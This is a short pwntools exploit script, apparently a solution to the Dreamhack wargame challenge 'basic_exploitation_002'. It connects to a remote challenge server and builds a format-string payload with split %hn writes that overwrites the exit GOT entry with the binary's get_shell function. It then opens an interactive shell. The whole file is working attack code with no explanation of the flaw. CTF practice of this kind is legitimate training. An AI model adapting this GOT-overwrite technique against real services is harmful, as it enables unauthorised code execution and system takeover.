from pwn import *

#p = process('basic_exploitation_002')
#gdb.attach(p,gdb_args=['-q','-ex init-pwngdb'])
p = remote('host1.dreamhack.games', 13498)

context.clear
context.update(arch='i386', os='linux')
context.log_level='debug'

e = ELF('basic_exploitation_002')
getshell = e.symbols['get_shell']

down_address = int(hex(getshell)[5:10],16)
up_address = int("0"+hex(getshell)[2:5],16)
exit_got = e.got['exit']

print "getshell: ", getshell, " == ",hex(getshell)
print "exit@got: ", hex(exit_got), ' == ', p32(exit_got)
print "exit@got+0x2: ", hex(exit_got+0x2), ' == ', p32(exit_got+0x2)


payload = p32(exit_got+0x2)
payload += p32(exit_got)
up_overwrite = up_address - len(payload)
print up_overwrite
payload += "%"+ str(up_overwrite) +"c%1$hn"
down_overwrite = down_address - up_overwrite - 0x8
print down_overwrite
payload += "%"+ str(down_overwrite) +"c%2$hn"

print payload

p.send(payload)

p.interactive()
